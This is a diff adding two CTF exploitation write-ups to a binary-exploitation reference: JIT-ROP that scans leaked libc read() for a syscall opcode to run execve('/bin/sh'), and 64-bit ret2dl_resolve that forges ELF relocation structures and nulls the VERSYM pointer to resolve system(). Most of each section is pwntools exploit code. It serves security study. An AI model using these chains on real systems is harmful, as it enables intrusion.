@@ -18,6 +18,8 @@
 - [Vsyscall ROP for PIE Bypass (Hack.lu 2015)](#vsyscall-rop-for-pie-bypass-hacklu-2015)
 - [x32 ABI Syscall Number Aliasing for Seccomp Bypass (BCTF 2017)](#x32-abi-syscall-number-aliasing-for-seccomp-bypass-bctf-2017)
 - [Time-Based Blind Shellcode When write() Blocked (DEF CON 2017)](#time-based-blind-shellcode-when-write-blocked-def-con-2017)
+- [JIT-ROP: Scan for syscall Byte in Leaked libc Function (Codegate 2018)](#jit-rop-scan-for-syscall-byte-in-leaked-libc-function-codegate-2018)
+- [ret2dl_resolve 64-bit (Codegate 2018)](#ret2dl_resolve-64-bit-codegate-2018)
 - [Useful Commands](#useful-commands)
 
 For core ROP chain building, ret2csu, bad character bypass, exotic gadgets, and stack pivot via xchg, see [rop-and-shellcode.md](rop-and-shellcode.md).
@@ -447,6 +449,170 @@ for i in range(FLAG_LEN):
 **When to recognize:** Seccomp allows `open`/`read` but blocks all write-family syscalls. Also applicable when the binary has no output path at all (e.g., embedded systems, bare-metal challenges).
 
 **References:** DEF CON 2017
+
+---
+
+## JIT-ROP: Scan for syscall Byte in Leaked libc Function (Codegate 2018)
+
+**Pattern:** Instead of identifying the remote libc version to find gadgets, leak a GOT entry (e.g., `read@GOT`), then read the machine code of that function to find a `syscall` instruction within it. Use the `read()` return value to control `rax` for the syscall number.
+
+**Exploitation:**
+```python
+from pwn import *
+
+# Step 1: Leak read@GOT address via format string / arbitrary read
+read_addr = leak_got(elf.got['read'])
+log.info(f"read() @ {hex(read_addr)}")
+
+# Step 2: Read bytes within read() function body
+# Use an arbitrary read primitive (e.g., format string %s, or read() itself)
+read_bytes = read_memory(read_addr, 0x100)
+
+# Step 3: Find syscall opcode (0x0f 0x05) within read()
+syscall_offset = read_bytes.index(b'\x0f\x05')
+syscall_addr = read_addr + syscall_offset
+log.info(f"syscall @ {hex(syscall_addr)}")
+
+# Step 4: Overwrite an unused GOT entry (e.g., srand) with syscall address
+write_got(elf.got['srand'], syscall_addr)
+
+# Step 5: Build ROP chain for execve via syscall
+# Trick: read() return value sets rax, so read exactly 59 bytes for __NR_execve
+pop_rdi = rop_gadget  # pop rdi; ret
+pop_rsi = rop_gadget  # pop rsi; ret
+pop_rdx = rop_gadget  # pop rdx; ret
+
+payload = flat(
+    pop_rdi, 0,                    # fd = stdin
+    pop_rsi, bss_addr,             # buf = writable BSS
+    pop_rdx, 59,                   # count = 59 = __NR_execve
+    elf.plt['read'],               # read(0, bss, 59) → rax = 59
+    pop_rdi, binsh_addr,           # rdi = "/bin/sh"
+    pop_rsi, 0,                    # rsi = NULL
+    pop_rdx, 0,                    # rdx = NULL
+    elf.plt['srand'],              # calls syscall (GOT overwritten)
+    # rax=59, rdi="/bin/sh", rsi=0, rdx=0 → execve("/bin/sh", NULL, NULL)
+)
+io.sendline(payload)
+
+# Send exactly 59 bytes so read() returns 59 (sets rax = __NR_execve)
+io.send(b'A' * 59)
+```
+
+**Why read() always contains syscall:**
+```text
+read() in libc is a thin wrapper around the syscall instruction:
+  mov eax, 0        ; SYS_read
+  syscall            ; <-- this is what we're scanning for
+  cmp rax, -4096
+  ...
+The bytes 0x0f 0x05 (syscall) are guaranteed to exist within read()
+```
+
+**Key insight:** Every libc function's code section contains useful gadgets. `read()` always contains a `syscall` instruction internally. By leaking a GOT entry and reading the function's machine code, you find `syscall` without knowing the libc version. The `read()` syscall return value conveniently sets `rax` to the number of bytes read — send exactly 59 bytes (`__NR_execve`) to set up the syscall number. This eliminates the need for a `pop rax; ret` gadget.
+
+**When to recognize:** Partial RELRO (GOT writable), no libc version available, but you can leak GOT entries and read arbitrary memory. Any function that performs a syscall internally (`read`, `write`, `open`, `mmap`) contains the `0f 05` bytes. `read()` is preferred because its return value naturally controls `rax`.
+
+**References:** Codegate 2018
+
+---
+
+## ret2dl_resolve 64-bit (Codegate 2018)
+
+**Pattern:** Forge fake `Elf64_Rela`, `Elf64_Sym`, and dynstr entries in writable memory (BSS) to trick the dynamic linker into resolving an arbitrary libc function (e.g., `system`) without knowing the libc base address. The 64-bit variant requires bypassing VERSYM checks by NULLing the version table pointer in the link_map.
+
+**How dynamic resolution works:**
+```text
+PLT stub → _dl_runtime_resolve(link_map, reloc_index)
+  1. Look up Elf64_Rela at .rela.plt[reloc_index]
+  2. Extract symbol index from r_info
+  3. Look up Elf64_Sym at .dynsym[sym_index]
+  4. Read symbol name from .dynstr + st_name offset
+  5. Search loaded libraries for that symbol name
+  6. [64-bit only] Check version via .gnu.version[sym_index]  ← must bypass
+  7. Write resolved address to GOT, jump to it
+```
+
+**Forging the structures:**
+```python
+from pwn import *
+
+# Target: resolve system() by forging resolution structures in BSS
+BSS = 0x601000          # writable memory
+STRTAB = elf.dynamic_value_by_tag('DT_STRTAB')
+SYMTAB = elf.dynamic_value_by_tag('DT_SYMTAB')
+JMPREL = elf.dynamic_value_by_tag('DT_JMPREL')
+
+# Calculate offsets so forged structures are self-consistent
+fake_rela_addr = BSS + 0x100
+fake_sym_addr = BSS + 0x200
+fake_str_addr = BSS + 0x300
+
+# Forged Elf64_Sym (24 bytes)
+# st_name: offset into dynstr where "system\x00" lives
+# st_info: STT_FUNC | STB_GLOBAL
+# st_other, st_shndx: 0
+# st_value, st_size: 0 (unresolved)
+sym_index = (fake_sym_addr - SYMTAB) // 24  # index into symtab
+fake_sym = flat(
+    p32(fake_str_addr - STRTAB),  # st_name (offset to "system" in dynstr)
+    p8(0x12),                      # st_info = STT_FUNC | STB_GLOBAL<<4
+    p8(0),                         # st_other
+    p16(0),                        # st_shndx = SHN_UNDEF
+    p64(0),                        # st_value
+    p64(0),                        # st_size
+)
+
+# Forged Elf64_Rela (24 bytes)
+# r_offset: GOT slot to write resolved address
+# r_info: (sym_index << 32) | R_X86_64_JUMP_SLOT
+# r_addend: 0
+reloc_index = (fake_rela_addr - JMPREL) // 24
+fake_rela = flat(
+    p64(BSS + 0x400),                      # r_offset (writable GOT slot)
+    p64((sym_index << 32) | 7),            # r_info: sym_idx | R_X86_64_JUMP_SLOT
+    p64(0),                                 # r_addend
+)
+
+# Forged dynstr entry
+fake_str = b"system\x00"
+
+# Write all structures to BSS via ROP chain
+# ...
+
+# CRITICAL: Bypass VERSYM check for 64-bit
+# Overwrite link_map->l_info[DT_VERSYM] with NULL
+# This skips version validation entirely
+# link_map address can be read from GOT[1]
+link_map_addr = read_got(1)  # GOT[1] = link_map pointer
+# l_info[DT_VERSYM] is at link_map + 0x1c8 (glibc-dependent)
+versym_ptr = link_map_addr + 0x1c8
+write_memory(versym_ptr, p64(0))  # NULL → skip version check
+
+# Trigger resolution: call PLT stub with forged reloc_index
+# _dl_runtime_resolve follows our forged chain:
+#   fake Rela → fake Sym → fake dynstr "system"
+#   → resolves system() → writes to fake GOT slot → jumps to system()
+```
+
+**ROP chain to trigger:**
+```python
+# After writing fake structures to BSS:
+# Push reloc_index and jump to PLT[0] (the universal resolver stub)
+plt_stub = elf.get_section_by_name('.plt').header.sh_addr
+
+payload = flat(
+    pop_rdi, binsh_addr,           # rdi = "/bin/sh" for system()
+    plt_stub,                       # push link_map; jmp _dl_runtime_resolve
+    p64(reloc_index),              # relocation index into forged .rela.plt
+)
+```
+
+**Key insight:** 64-bit ret2dl_resolve is harder than 32-bit because of VERSYM checks. Overwrite `link_map->l_info[DT_VERSYM]` with NULL to skip version validation entirely. Then the standard approach works: forge Rela -> Sym -> dynstr chain in writable memory, trigger resolution via PLT stub with crafted reloc index. This resolves arbitrary libc functions without knowing the libc base — the dynamic linker does the work for you.
+
+**When to recognize:** No libc leak available, Partial RELRO (PLT/GOT writable), binary has enough ROP gadgets to write to BSS and control function arguments. Works on any glibc version (the VERSYM bypass via NULL is universal). Prefer this over blind libc identification when the remote libc version is completely unknown.
+
+**References:** Codegate 2018
 
 ---
 
